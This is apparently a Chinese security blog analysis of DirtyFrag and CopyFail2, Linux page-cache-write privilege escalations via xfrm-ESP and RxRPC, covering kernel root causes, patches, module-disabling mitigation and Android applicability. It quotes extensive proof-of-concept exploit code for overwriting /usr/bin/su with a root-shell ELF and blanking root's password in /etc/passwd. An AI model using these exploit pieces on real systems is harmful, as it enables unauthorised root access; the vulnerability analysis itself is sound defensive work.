#  最近是怎么了？又一款通杀全线Linux发行版的0Day漏洞  
原创 非虫
                    非虫  软件安全与逆向分析   2026-05-08 01:48  
  
# 又一款通杀全线Linux发行版的0Day漏洞  
  
2026年5月7日，又一个Linux本地提权洞公开了，名字叫DirtyFrag。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Sq4BUsrXeTibaajpcjDn39fBBl1m3beD3lWIJLQJUU8Ns8QslUvPC1eOohSWniavib9EsjxPhJOVsVHhs8t4lMLicn30yLiak7o2ia3WZBr231Hicc/640?wx_fmt=png&from=appmsg "")  
  
  
仓库地址是：https://github.com/V4bel/dirtyfrag  
  
这个漏洞不是靠单个入口覆盖所有环境，而是把两个同类页缓存写问题串到了一起。第一条链路走xfrm-ESP，能拿到4字节页缓存写；第二条链路走RxRPC，写入值不如ESP自由，但不依赖用户命名空间。两个入口互相补盲区，所以仓库里把它称为Universal Linux LPE  
。  
  
截至2026年5月8日，仓库说明里还没有统一CVE编号。ESP分支已有netdev树补丁，RxRPC分支也有公开补丁邮件，但发行版是否回补仍然要看各自公告。  
## 背景  
  
DirtyFrag属于DirtyPipe、CopyFail这一类问题：攻击者没有目标文件的写权限，却能让内核在页缓存上写入数据。这里的关键点不是磁盘文件被直接写了，而是PageCache里的那一页被改了。后续进程读这个文件时，读到的就是被污染后的内存副本，直到缓存被丢弃或系统重启。  
  
DirtyPipe污染的是struct pipe_buffer  
，DirtyFrag污染的是struct sk_buff  
里的frag  
。名字里的Frag就是这个意思。  
  
从影响时间看，仓库README给出的跨度很长。xfrm-ESP分支从2017年1月17日的cac2661c53f3  
开始受影响，RxRPC分支从2023年6月的2dc334f1a63a  
开始受影响。两条链合起来，漏洞有效生命周期接近9年。  
  
它的共同入口可以拆成三步：  
1. 攻击者只读打开目标文件，比如/usr/bin/su  
或/etc/passwd  
。  
  
1. 通过splice()  
把目标文件的页缓存页零拷贝塞进网络发送侧skb->frags[]  
。  
  
1. 接收侧内核代码认为自己只是在原地做解密校验，结果把解密过程中的STORE写到了攻击者塞进来的页缓存页上。  
  
抽象成路径就是：  
```
只读文件PageCache
	被splice引用到pipe
	被splice发送到socket
	进入skb->frags[]
	接收侧原地解密
	解密过程对frag执行STORE
	PageCache被改写

```  
  
关键点在写入和失败返回的顺序：认证失败发生在写入之后。攻击者不需要知道真正的认证密钥，只要能让内核走到原地解密路径，STORE已经发生了，后面的-EBADMSG  
或-EPROTO  
只是在写完之后返回的错误码。  
## 从CopyFail到CopyFail2  
  
之前那篇文章分析的是CopyFail，也就是CVE-2026-31431。那条链的核心在AF_ALG  
，攻击者通过splice(file->pipe->AF_ALG)  
把只读文件的PageCache页带进内核加密路径，再利用algif_aead  
状态机和原地解密写回，让内核把数据写到页缓存里。  
  
后来出现的Copy_Fail2-Electric_Boogaloo  
沿用了这个方向，但落点换到了网络协议栈。仓库地址是：https://github.com/0xdeadbeefnetwork/Copy_Fail2-Electric_Boogaloo  
  
它名字叫CopyFail2，但漏洞入口已经不再是AF_ALG  
状态机，而是xfrm ESP-in-UDP的MSG_SPLICE_PAGES  
无COW快路径。换句话说，它和CopyFail同属“只读PageCache被内核写回”的大类，但具体子系统已经切到XFRM/ESP，也就是DirtyFrag里ESP分支的核心位置。  
  
这里的no-COW fast path  
就是本文后面要讲的esp_input()  
跳过skb_cow_data()  
路径。MSG_SPLICE_PAGES  
则是UDP发送侧把pipe里的页直接挂到skb->frags[]  
，让目标文件PageCache以网络包frag的身份进入ESP接收路径。  
  
从仓库测试结果看，它覆盖Ubuntu24.04、Debian13、Arch、Fedora43、Ubuntu26.04等较新的内核；Ubuntu22.04的5.15内核不在它的触发范围内，因为UDP侧MSG_SPLICE_PAGES  
支持是在6.5之后进入的。  
  
CopyFail2和DirtyFrag ESP分支的差异主要在利用策略。  
  
DirtyFrag ESP分支利用ESN的seq_hi  
做4字节可控STORE，直接把/usr/bin/su  
第一页换成192字节root-shellELF。CopyFail2走rfc4106(gcm(aes))  
，目标换成/etc/passwd  
里一条无登录用户行，逐字节改成空密码uid0用户。中间填充字节用于保持原始行长度不变：  
```
sick::0:0:XXXXXXXXXXXXXXXX:/:/bin/bash

```  
  
逐字节改写靠的是GCM的计数器流。CopyFail2先读出目标文件某个字节C  
，再指定想要的明文字节P  
，需要的keystream字节就是：  
```
keystream = C ^ P

```  
  
PoC里对应的逻辑如下：  
```
unsignedchar tbyte;
pread(tfd, &tbyte, 1, tboff);
unsignedchar want_ks = tbyte ^ want_plain;

for (ivv = 1; ivv < (1ULL<<32); ivv++) {
memcpy(IV, &ivv, IVLEN);
memcpy(nonce + SALT_LEN, IV, IVLEN);
	aes_gcm_keystream_byte(AEAD_KEY, nonce, 0, &ks_byte);
if (ks_byte == want_ks)
break;
}

```  
  
这里没有爆破密钥。AEADkey固定，变化的是IV；只要第0个keystream字节等于want_ks  
，ESP解密时目标文件原字节C  
和keystream异或后，就会得到想要的P  
。  
  
接着它通过ip xfrm state add  
注册ESP状态，算法是rfc4106(gcm(aes))  
：  
```
snprintf(cmd, sizeof cmd,
"ip link set lo up ; "
"ip xfrm state flush ; "
"ip xfrm state add src 127.0.0.1 dst 127.0.0.1 "
"proto esp spi 0x%08x "
"encap espinudp %d %d 0.0.0.0 "
"aead 'rfc4106(gcm(aes))' %s 128 "
"replay-window 32",
	SPI, ENC_PORT, ENC_PORT, keyhex);

```  
  
这里依然需要XFRM配置能力，所以它会运行在user和net命名空间中。仓库还提供了aa-rootns.c  
，用于在特定Ubuntu策略下尝试拿到命名空间内所需能力。这个点比原始CopyFail更贴近真实发行版环境：漏洞触发之外，还要处理user namespace策略。  
  
把目标页送进ESP路径的代码集中在三次splice()  
和一次splice(pipe->socket)  
：  
```
splice(afd2, &off, pfd[1], NULL, 16, SPLICE_F_MORE);
splice(tfd, &toff, pfd[1], NULL, 1, SPLICE_F_MORE);
splice(afd2, &ioff, pfd[1], NULL, 16, SPLICE_F_MORE);

int ss = socket(AF_INET, SOCK_DGRAM, 0);
connect(ss, (struct sockaddr *)&da, sizeof da);
splice(pfd[0], NULL, ss, NULL, 16 + 1 + 16, 0);

```  
  
前三次splice()  
分别塞入ESP头、目标文件的1字节PageCache、伪ICV。最后一次splice(pipe->UDPsocket)  
让内核设置MSG_SPLICE_PAGES  
，这1字节目标文件页就会作为skb->frags[]  
进入ESP接收路径。  
  
外层run.sh  
负责把“单字节写”扩展成“整行替换”。它先找/etc/passwd  
里最长的nologin  
、false  
或sync  
用户行，然后构造同长度的新行，避免破坏文件结构。  
```
PREFIX="${NEW_USER}::0:0:"
SUFFIX=":/:/bin/bash"
PAD_LEN=$((VICTIM_LEN - ${#PREFIX} - ${#SUFFIX}))
PAD=$(printf'%*s'"$PAD_LEN"'' | tr' ''X')
TARGET_LINE="${PREFIX}${PAD}${SUFFIX}"

```  
  
然后逐字节比较原始行和目标行，只对不同字节调用底层写原语：  
```
for ((i=0; i<len; i++)); do
	o="${src:$i:1}"
	t="${dst:$i:1}"
if [ "$o" != "$t" ]; then
		FLIPS+=("$((line_off + i)):$(printf '0x%02x' "'$t")")
fi
done

```  
  
这种写法不改行长，不移动后续字段偏移。页缓存里出现空密码uid0用户后，再通过su  
进入它。  
  
CopyFail2还补了IPv6版本。README中特别强调同类问题也能落到esp6_input()  
，IPv6PoC使用::1  
回环和ip -6 xfrm  
，并且多塞了16字节padding，因为xfrm6_input.c  
存在长度检查，UDPpayload至少要达到40字节。需要注意的是，当前能查到的netdev修复提交f4c50a4034e62ab75f1d5cdd191dd5f9c77fdff4  
已经同时修改了esp4.c  
、esp6.c  
、ip_output.c  
和ip6_output.c  
；如果某个发行版只回补了IPv4侧修复，IPv6侧才会继续成为绕过面。  
```
if (splice(afd2, &off, pfd[1], NULL, 16, SPLICE_F_MORE) != 16)
	die("splice esp_hdr");
if (splice(tfd, &toff, pfd[1], NULL, 1, SPLICE_F_MORE) != 1)
	die("splice target byte");
if (splice(afd2, &poff, pfd[1], NULL, 16, SPLICE_F_MORE) != 16)
	die("splice pad");
if (splice(afd2, &ioff, pfd[1], NULL, 16, SPLICE_F_MORE) != 16)
	die("splice icv");

```  
  
三者关系可以压成下面这张表：  
```
CopyFail：
	AF_ALG状态机问题，PageCache进入加密socket后被写回

CopyFail2：
	xfrm ESP-in-UDP无COW快路径，PageCache进入skb->frag后被ESP写回

DirtyFrag：
	把xfrm-ESP Page-Cache Write和RxRPC Page-Cache Write串联
	用两条链覆盖不同发行版策略与模块差异

```  
  
CopyFail2可以理解为CopyFail思路迁移到XFRM/ESP后的版本；从根因看，它已经踩在DirtyFrag ESP分支的同一位置，只是payload组织方式不同。  
## xfrm-ESP漏洞原理  
  
先看ESP这条链。问题出在esp_input()  
处理非线性skb  
时跳过了skb_cow_data()  
。  
  
正常情况下，如果skb  
的数据来自外部共享页，内核在原地修改之前应该先做copy-on-write，复制到内核自己的私有buffer里。但漏洞分支里只要skb  
没有被clone，并且没有frag_list  
，就直接goto skip_cow  
。  
```
staticintesp_input(struct xfrm_state *x, struct sk_buff *skb)
{
if (!skb_cloned(skb)) {
if (!skb_is_nonlinear(skb)) {
			nfrags = 1;
goto skip_cow;
		} elseif (!skb_has_frag_list(skb)) {
			nfrags = skb_shinfo(skb)->nr_frags;
			nfrags++;
goto skip_cow;
		}
	}

	err = skb_cow_data(skb, 0, &trailer);
}

```  
  
问题就藏在第二个分支里。通过splice()  
发出去的文件页会挂在skb_shinfo(skb)->frags[]  
，这是非线性skb  
，但它通常没有frag_list  
。于是esp_input()  
绕过了COW，后续加解密直接在这个页缓存页上操作。  
  
接下来看写入位置。ESP配合ESN和authencesn(hmac(sha256),cbc(aes))  
时，会在crypto_authenc_esn_decrypt()  
里移动高32位序列号。这个移动不是纯逻辑移动，而是一次真实写入。  
```
staticintcrypto_authenc_esn_decrypt(struct aead_request *req)
{
	scatterwalk_map_and_copy(tmp, src, 0, 8, 0);
if (src == dst) {
		scatterwalk_map_and_copy(tmp, dst, 4, 4, 1);
		scatterwalk_map_and_copy(tmp + 1, dst,
			assoclen + cryptlen, 4, 1);
		dst = scatterwalk_ffwd(areq_ctx->dst, dst, 4);
	}
}

```  
  
scatterwalk_map_and_copy(...,1)  
表示向目标scatterlist写数据。因为前面aead_request_set_crypt(req,sg,sg,...)  
让src  
和dst  
指向同一批sg  
，所以这里写的不是普通临时buffer，而是skb->frags[]  
背后的PageCache。  
  
ESP分支最终得到的是一次稳定的4字节STORE。  
  
这4字节的值来自ESN高32位序列号，而这个字段可由攻击者在SA里提前放好：  
```
staticvoidesp_input_set_header(struct sk_buff *skb, __be32 *seqhi)
{
structxfrm_state *x = xfrm_input_state(skb);
structip_esp_hdr *esph;

if ((x->props.flags & XFRM_STATE_ESN)) {
		esph = skb_push(skb, 4);
		*seqhi = esph->spi;
		esph->spi = esph->seq_no;
		esph->seq_no = XFRM_SKB_CB(skb)->seq.input.hi;
	}
}

```  
  
XFRM_SKB_CB(skb)->seq.input.hi  
最终来自XFRM状态里的replay_esn->seq_hi  
。而这个值是在注册SA时通过XFRMA_REPLAY_ESN_VAL  
属性传进去的。PoC正是把要写入的4字节payload塞到这里。  
## ESP路径代码块解析  
  
PoC把目标选成/usr/bin/su  
，因为它本来就是setuid-root程序。把su  
的PageCache第一页临时换成极小的root-shellELF后，再执行/usr/bin/su  
，内核加载的是被污染后的ELF内容，setuid位仍然生效。  
  
目标和payload相关宏只有几个：  
```
#define TARGET_PATH      "/usr/bin/su"
#define PATCH_OFFSET     0
#define PAYLOAD_LEN      192
#define ENTRY_OFFSET     0x78

```  
  
源码里的shell_elf[PAYLOAD_LEN]  
是一段192字节ELF。这里不是把payload写进磁盘上的/usr/bin/su  
，而是覆盖/usr/bin/su  
的PageCache前192字节。ENTRY_OFFSET  
处是新ELF入口，里面做setgid(0)  
、setuid(0)  
、setgroups(0,NULL)  
，最后execve("/bin/sh",...)  
。  
  
ESP需要注册XFRM SA，这要求CAP_NET_ADMIN  
。普通用户没有这个权限，所以PoC先进入新的user和net命名空间：  
```
staticvoidsetup_userns_netns(void)
{
uid_t real_uid = getuid();
gid_t real_gid = getgid();
charmap[64];

	unshare(CLONE_NEWUSER | CLONE_NEWNET);
	write_proc("/proc/self/setgroups", "deny");
snprintf(map, sizeof(map), "0 %u 1", real_uid);
	write_proc("/proc/self/uid_map", map);
snprintf(map, sizeof(map), "0 %u 1", real_gid);
	write_proc("/proc/self/gid_map", map);

int s = socket(AF_INET, SOCK_DGRAM, 0);
structifreqifr;memset(&ifr, 0, sizeof(ifr));
strncpy(ifr.ifr_name, "lo", IFNAMSIZ);
	ioctl(s, SIOCGIFFLAGS, &ifr);
	ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
	ioctl(s, SIOCSIFFLAGS, &ifr);
}

```  
  
这段代码的目的不是直接拿宿主root，而是在新命名空间里获得配置XFRM所需的网络管理能力，并把lo  
接口拉起来。后面所有包都打到127.0.0.1:4500  
。  
  
接着是注册SA，关键字段是seq_hi  
：  
```
staticintadd_xfrm_sa(uint32_t spi, uint32_t patch_seqhi)
{
structxfrm_usersa_info *xs = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);

	xs->id.spi = htonl(spi);
	xs->id.proto = IPPROTO_ESP;
	xs->family = AF_INET;
	xs->mode = XFRM_MODE_TRANSPORT;
	xs->flags = XFRM_STATE_ESN;

structxfrm_replay_state_esn *esn =
		(struct xfrm_replay_state_esn *)esn_buf;
	esn->bmp_len = 1;
	esn->seq = REPLAY_SEQ;
	esn->seq_hi = patch_seqhi;
	esn->replay_window = 32;
	put_attr(nlh, XFRMA_REPLAY_ESN_VAL, esn_buf, sizeof(esn_buf));
}

```  
  
patch_seqhi  
就是最终会被STORE到目标页缓存里的4字节。PoC按4字节切分shell_elf  
，每4字节注册一个SPI不同的SA。  
```
for (int i = 0; i < PAYLOAD_LEN / 4; i++) {
uint32_t spi = 0xDEADBE10 + i;
uint32_t seqhi =
		((uint32_t)shell_elf[i*4 + 0] << 24) |
		((uint32_t)shell_elf[i*4 + 1] << 16) |
		((uint32_t)shell_elf[i*4 + 2] << 8) |
		((uint32_t)shell_elf[i*4 + 3]);

	add_xfrm_sa(spi, seqhi);
}

```  
  
这个循环把“要写入的4字节”转换成“XFRM状态里的ESN高32位”。后续每触发一次指定SPI的ESP包，就在对应文件偏移写4字节。  
  
do_one_write()  
里和页缓存写有关的是下面几行：  
```
uint8_t hdr[24];
*(uint32_t *)(hdr + 0) = htonl(spi);
*(uint32_t *)(hdr + 4) = htonl(SEQ_VAL);
memset(hdr + 8, 0xCC, 16);

structioveciov_h = { .iov_base = hdr, .iov_len = sizeof(hdr) };
vmsplice(pfd[1], &iov_h, 1, 0);
splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE);
splice(pfd[0], NULL, sk_send, NULL, 24 + 16, SPLICE_F_MOVE);

```  
  
前置的socket设置决定这批数据会进入ESP接收路径：  
1. setsockopt(...,UDP_ENCAP_ESPINUDP,...)  
会让UDP接收路径进入ESP-in-UDP处理逻辑，包会被送到xfrm4_udp_encap_rcv()  
，再进入esp_input()  
。  
  
1. vmsplice()  
先把伪造ESP头放入pipe，splice(file_fd,...)  
再把目标文件页缓存挂入pipe，最后splice(pipe,socket,...)  
把它们送进UDPsocket。由于走零拷贝路径，目标文件页以skb->frags[0]  
形态到达接收侧。  
  
最终接收侧看到的skb  
大概是这样：  
```
skb {
	head: ESP头8字节，IV16字节
	frags[0]: PageCache页P，偏移i*4，长度16字节
}

```  
  
而漏洞写入发生在接收侧：  
```
udp_rcv
	xfrm4_udp_encap_rcv
		xfrm_input
			esp_input
				跳过skb_cow_data
				esp_input_set_header写入seq_hi
				skb_to_sgvec把frag映射到sg
				crypto_authenc_esn_decrypt
					scatterwalk_map_and_copy写4字节到PageCache

```  
  
ESP路径没有竞争窗口，不靠抢时序。只要包走到这条分支，页缓存页就会出现在原地解密的写入位置。  
## RxRPC漏洞原理  
  
ESP路径写入能力更强，但它有一个现实问题：需要unshare(CLONE_NEWUSER|CLONE_NEWNET)  
。Ubuntu近年可能通过AppArmor策略限制非特权用户创建user namespace，这会让ESP路径起不来。  
  
针对这个盲区，DirtyFrag接上了RxRPC路径。  
  
RxRPC分支的问题点在rxkad_verify_packet_1()  
。它为了校验RXRPC_SECURITY_AUTH  
级别的数据包，会对skb  
里的前8字节payload做一次原地pcbc(fcrypt)  
解密。  
```
staticintrxkad_verify_packet_1(struct rxrpc_call *call,struct sk_buff *skb, rxrpc_seq_t seq,struct skcipher_request *req)
{
	sg_init_table(sg, ARRAY_SIZE(sg));
	ret = skb_to_sgvec(skb, sg, sp->offset, 8);
if (unlikely(ret < 0))
return ret;

memset(&iv, 0, sizeof(iv));

	skcipher_request_set_sync_tfm(req, call->conn->rxkad.cipher);
	skcipher_request_set_callback(req, 0, NULL, NULL);
	skcipher_request_set_crypt(req, sg, sg, 8, iv.x);
	ret = crypto_skcipher_decrypt(req);
}

```  
  
这里的sg,sg  
说明源和目的相同。只要攻击者能通过splice()  
把目标文件页塞进skb->frags[]  
，skb_to_sgvec()  
就会把这个页缓存页映射成scatterlist，后面的crypto_skcipher_decrypt()  
就会在页缓存上做8字节STORE。  
  
但RxRPC和ESP不一样。ESP写入值来自seq_hi  
，几乎可以当任意4字节写。RxRPC写入值是：  
```
P = fcrypt_decrypt(C,K)

```  
  
其中C  
是当前位置原本的8字节内容，K  
是攻击者通过RxRPCkey控制的8字节session key。攻击者不能直接指定P  
，只能离线爆破K  
，直到解密结果满足目标格式。  
  
所以RxRPC路径不适合像ESP那样写完整ELF。PoC换了一个更省字节的目标：/etc/passwd  
第一行。  
  
正常root行类似：  
```
root:x:0:0:root:/root:/bin/bash

```  
  
PoC要把它改成：  
```
root::0:0:GGGGGG:/root:/bin/bash

```  
  
也就是把root的密码字段变成空字符串。在PoC针对的Ubuntu等PAM配置中，pam_unix.so nullok  
会接受空密码字段，su  
认证就能被绕过去。  
## RxRPC路径代码块解析  
  
RxRPC的第一步是准备攻击者控制的session key。PoC构造RxRPCv1token，把SESSION_KEY  
塞进去，再用add_key()  
注册到当前进程keyring。  
```
staticuint8_t SESSION_KEY[8] = {
0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,
};

staticintbuild_rxrpc_v1_token(uint8_t *out, size_t maxlen)
{
	*(uint32_t *)p = htonl(2);
	*(uint32_t *)p = htonl(0);
	*(uint32_t *)p = htonl(1);
memcpy(p, SESSION_KEY, 8);
}

staticlongadd_rxrpc_key(constchar *desc)
{
return key_add("rxrpc", desc, buf, n, KEY_SPEC_PROCESS_KEYRING);
}

```  
  
sec_ix=2  
表示RXKAD。内核后面建立安全上下文时，会用这个session key初始化pcbc(fcrypt)  
cipher。  
  
接着PoC在用户态复刻了fcrypt  
，做离线搜索。它没有尝试约束完整8字节，因为那样代价太高，而是只约束最终/etc/passwd  
格式必须成立的字节。  
```
staticinlineintfc_check_pa_nullok(constuint8_t P[8])
{
return P[0] == ':' && P[1] == ':';
}

staticinlineintfc_check_pb_nullok(constuint8_t P[8])
{
return P[0] == '0' && P[1] == ':';
}

staticinlineintfc_check_pc_nullok(constuint8_t P[8])
{
if (P[0] != '0') return0;
if (P[1] != ':') return0;
if (P[7] != ':') return0;
for (int i = 2; i < 7; i++) {
if (P[i] == ':' || P[i] == '\0' || P[i] == '\n')
return0;
	}
return1;
}

```  
  
这三个谓词对应三次重叠写：  
```
offset4写8字节，最终只保留第0到第1字节，目标是::
offset6写8字节，最终只保留第0到第1字节，目标是0:
offset8写8字节，最终保留全部8字节，目标是0:任意合法5字节:

```  
  
因为三次写入区域重叠，后写覆盖先写，最后效果是：  
```
root:x:0:0:root:/root:/bin/bash
root::0:0:GGGGGG:/root:/bin/bash

```  
  
离线搜索函数保留了最小循环：  
```
staticintfind_K_offline_generic(constuint8_t C[8],uint64_t max_iters, pcheck_fn check,uint8_t K_out[8], uint8_t P_out[8],uint64_t seed_init, constchar *label)
{
for (uint64_t iter = 0; iter < max_iters; iter++) {
uint64_t r = fc_splitmix64(&seed);
memcpy(K, &r, 8);
		fcrypt_user_setkey(&ctx, K);
		fcrypt_user_decrypt(&ctx, P, C);

if (check(P)) {
memcpy(K_out, K, 8);
memcpy(P_out, P, 8);
return0;
		}
	}
return-1;
}

```  
  
这个函数完全在用户态跑，不触发内核漏洞。它只是找一个合适的K  
，让fcrypt_decrypt(C,K)  
的输出满足passwd行格式。  
  
第二次和第三次搜索不能直接使用原始文件字节。第一次写入之后，offset6开始的8字节已经变了；第二次写入之后，offset8开始的8字节也变了。PoC专门修正了这个链式关系：  
```
find_K_offline_generic(Ca, max_iters,
	fc_check_pa_nullok, Ka, Pa_out, seed_base, "K_A");

memcpy(Cb_actual, Pa_out + 2, 6);
memcpy(Cb_actual + 6, Cb + 6, 2);
find_K_offline_generic(Cb_actual, max_iters,
	fc_check_pb_nullok, Kb, Pb_out, seed_base, "K_B");

memcpy(Cc_actual, Pb_out + 2, 6);
memcpy(Cc_actual + 6, Cc + 6, 2);
find_K_offline_generic(Cc_actual, max_iters,
	fc_check_pc_nullok, Kc, Pc_out, seed_base, "K_C");

```  
  
如果这里不修正Cb_actual  
和Cc_actual  
，离线算出来的key在真实内核触发时就会错位。RxRPC分支能稳定落点，靠的就是这处链式修正。  
  
内核写入由do_one_trigger()  
触发。握手和CHALLENGE  
部分只负责让客户端建立RXKAD上下文，页缓存写入集中在构造DATA头和splice()  
发送这一段：  
```
long key = add_rxrpc_key(keyname);

compute_csum_iv(epoch, cid, 2, SESSION_KEY, csum_iv);
compute_cksum(cid, callN, 1, SESSION_KEY, csum_iv, &cksum_h);

structrxrpc_wire_headermal = {0};
mal.epoch = htonl(epoch);
mal.cid = htonl(cid);
mal.callNumber = htonl(callN);
mal.seq = htonl(1);
mal.type = RXRPC_PACKET_TYPE_DATA;
mal.flags = RXRPC_LAST_PACKET;
mal.securityIndex = 2;
mal.cksum = htons(cksum_h);
mal.serviceId = htons(svc_in);

structiovecviv = { .iov_base = &mal, .iov_len = sizeof(mal) };
vmsplice(p[1], &viv, 1, 0);
splice(target_fd, &off, p[1], NULL, splice_len, SPLICE_F_NONBLOCK);
splice(p[0], NULL, udp_srv, NULL, sizeof(mal) + splice_len, 0);
recvmsg(rxsk_cli, &m, 0);

```  
  
add_key("rxrpc",...)  
把当前轮次的SESSION_KEY  
交给内核。前面的RxRPC握手让客户端把这个key用于RXKAD安全上下文。随后DATA包的cksum  
也用同一个key算出来，包才能走到rxkad_verify_packet_1()  
。最后两次splice()  
把DATA头和/etc/passwd  
的PageCache页拼成一个UDP包，recvmsg()  
推动客户端消费这个包，原地解密随之发生。  
  
对应到内核接收路径：  
```
recvmsg
	rxrpc_recvmsg
		rxrpc_recvmsg_data
			rxrpc_verify_data
				rxkad_verify_packet
					rxkad_verify_packet_1
						skb_to_sgvec映射frag
						skcipher_request_set_crypt使用sg作为src和dst
						crypto_skcipher_decrypt写回PageCache

```  
## 两条链为什么能通杀  
  
单看任意一条链，都有明显边界。  
  
ESP链的写入能力直接，4字节值和偏移都能控制，所以可以拼出一个192字节root-shellELF。缺点是要能创建user和net命名空间，从而拿到当前命名空间里的CAP_NET_ADMIN  
。如果发行版策略禁用了非特权user namespace，这条路就断了。  
  
RxRPC链优点是不需要user namespace，add_key()  
、socket(AF_RXRPC)  
、socket(AF_ALG)  
、splice()  
和recvmsg()  
都可以由普通用户触发。缺点是写入值要靠fcrypt_decrypt(C,K)  
碰撞，不能随便写大段payload，并且目标系统要有rxrpc.ko  
。  
  
DirtyFrag把两者串起来：  
```
if (force_rxrpc) {
	rc = rxrpc_lpe_main(new_argc, co_argv);
for (int i = 0; !passwd_already_patched() && i < 3; i++)
		rc = rxrpc_lpe_main(new_argc, co_argv);
} elseif (force_esp) {
	rc = su_lpe_main(new_argc, co_argv);
} else {
	rc = su_lpe_main(new_argc, co_argv);
if (!su_already_patched()) {
		rc = rxrpc_lpe_main(new_argc, co_argv);
for (int i = 0; !passwd_already_patched() && i < 3; i++)
			rc = rxrpc_lpe_main(new_argc, co_argv);
	}
}

```  
  
默认流程是先走ESP；如果/usr/bin/su  
没有被污染，再切到RxRPC，尝试污染/etc/passwd  
。最后统一走run_root_pty()  
执行su -  
并接管交互。  
  
污染判定只看两个稳定位置：  
```
staticintsu_already_patched(void)
{
	pread(fd, got, sizeof(got), 0x78);
returnmemcmp(got, su_marker, sizeof(su_marker)) == 0;
}

staticintpasswd_already_patched(void)
{
	pread(fd, head, sizeof(head), 0);
returnmemcmp(head, "root::0:0", 9) == 0;
}

```  
  
DirtyFrag所谓通杀，不是一个入口覆盖所有Linux发行版，而是两个页缓存写漏洞分别覆盖彼此盲区。  
## 补丁与缓解  
  
ESP分支的修复思路是给从splice()  
来的外部共享frag打标记，然后在ESP输入路径里识别它，强制走COW。  
```
-		} else if (!skb_has_frag_list(skb)) {
+		} else if (!skb_has_frag_list(skb) &&
+			   !skb_has_shared_frag(skb)) {
			nfrags = skb_shinfo(skb)->nr_frags;
			nfrags++;

```  
  
发送路径上增加标记：  
```
+			if (!(flags & MSG_NO_SHARED_FRAGS))
+				skb_shinfo(skb)->flags |= SKBFL_SHARED_FRAG;

```  
  
这个补丁的思路比单纯在ESP里无脑skb_cow_data()  
更克制：只要frag来自外部共享页，就不允许它走原地解密快路径。  
  
RxRPC分支的补丁更短。原代码只检查skb_cloned(skb)  
，但从splice()  
来的非线性skb  
不一定是cloned。补丁把skb->data_len  
也纳入检查，只要有非线性数据，就先复制。  
```
-			    skb_cloned(skb)) {
+			    (skb_cloned(skb) || skb->data_len)) {
				/* Unshare the packet so that it can be
				 * modified by in-place decryption.
				 */

```  
  
临时缓解可以禁用相关模块：  
```
printf'install esp4 /bin/false\ninstall esp6 /bin/false\ninstall rxrpc /bin/false\n' \
	> /etc/modprobe.d/dirtyfrag.conf
rmmod esp4 esp6 rxrpc 2>/dev/null

```  
  
这只是临时措施。生产环境最终还是要跟进发行版内核更新，尤其要确认ESP和RxRPC两个分支是否都已经回补。  
## 总结  
  
DirtyFrag是一个页缓存引用边界被网络协议栈打穿的逻辑漏洞。用户态通过splice()  
把只读文件页带进skb->frag  
，内核协议代码又在没有隔离的情况下原地解密，于是“只读文件页”变成了“可被内核写的目的buffer”。  
  
那么，这个洞是否可以作用于安卓实现LPE提权？  
  
以安卓GKI arm64配置为例，虽然XFRM和ESP需要的内核配置：CONFIG_XFRM_USER=y  
、CONFIG_INET_ESP=y  
、CONFIG_INET6_ESP=y  
在GKI内核中都开启了。但问题是ESP链需要能配置XFRM状态，核心权限是CAP_NET_ADMIN  
。这在安卓上就不行了，普通用户设备可取不了这个权限。还有GKI配置里能看到CONFIG_NAMESPACES=y  
，但CONFIG_USER_NS  
和CONFIG_NET_NS  
在该配置中没有打开，CONFIG_PID_NS  
也明确关闭；再叠加应用沙箱、SELinux和seccomp，普通App不能按发行版那套方式创建可用的网络命名空间并配置XFRM。  
  
一句话总结就是：就算把用户态代码交叉编译成安卓ELF，普通App进程也很难走到DirtyFrag需要的RxRPC触发面。  
## 参考资料  
1. DirtyFrag仓库：https://github.com/V4bel/dirtyfrag  
  
1. DirtyFrag官方技术说明：https://github.com/V4bel/dirtyfrag/blob/master/assets/write-up.md  
  
1. ESP修复提交：https://git.kernel.org/pub/scm/linux/kernel/git/netdev/net.git/commit/?id=f4c50a4034e62ab75f1d5cdd191dd5f9c77fdff4  
  
1. ESP补丁邮件：https://lore.kernel.org/all/afLDKSvAvMwGh7Fy@v4bel/  
  
1. RxRPC补丁邮件：https://lore.kernel.org/all/afKV2zGR6rrelPC7@v4bel/  
  
1. CopyFail2仓库：https://github.com/0xdeadbeefnetwork/Copy_Fail2-Electric_Boogaloo  
  
1. Android GKI arm64配置：https://android.googlesource.com/kernel/common/+/refs/heads/android-mainline/arch/arm64/configs/gki_defconfig  
  
1. Android seccomp说明：https://android-developers.googleblog.com/2017/07/seccomp-filter-in-android-o.html  
  
1. Android SELinux说明：https://source.android.com/docs/security/features/selinux  
  
